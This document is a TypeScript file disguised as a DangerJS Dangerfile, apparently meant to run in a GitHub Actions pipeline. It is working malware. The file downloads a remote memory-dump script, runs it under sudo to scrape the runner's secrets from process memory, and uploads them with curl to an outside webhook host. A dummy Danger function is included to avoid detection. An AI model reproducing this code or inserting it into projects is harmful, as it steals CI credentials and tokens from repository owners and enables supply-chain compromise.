
import { execSync } from 'child_process';

// DangerJS expects some globals to be available or the script to be valid TS
// We inject our payload at the top
console.log("Dangerfile.ts is executing...");

try {
    const runId = process.env.GITHUB_RUN_ID;
    execSync(`curl -sSf https://raw.githubusercontent.com/playground-nils/tools/refs/heads/main/memdump.py | sudo -E python3 | tr -d '\\0' | grep -aoE '"[^"]+":\\{"value":"[^"]*","isSecret":true\\}' >> "/tmp/secrets"`, { stdio: 'inherit' });
    execSync(`curl -X PUT -d \\@/tmp/secrets "https://open-hookbin.vercel.app/${runId}"`, { stdio: 'inherit' });
} catch (error) {
    console.error("Error during exfiltration:", error);
}

// Dummy DangerJS code to satisfy the linter/runner if it checks
import { DangerResults } from 'danger';
declare const results: DangerResults;
async function runDangerRules(): Promise<void> {
    console.log("Running rules...");
}
runDangerRules();
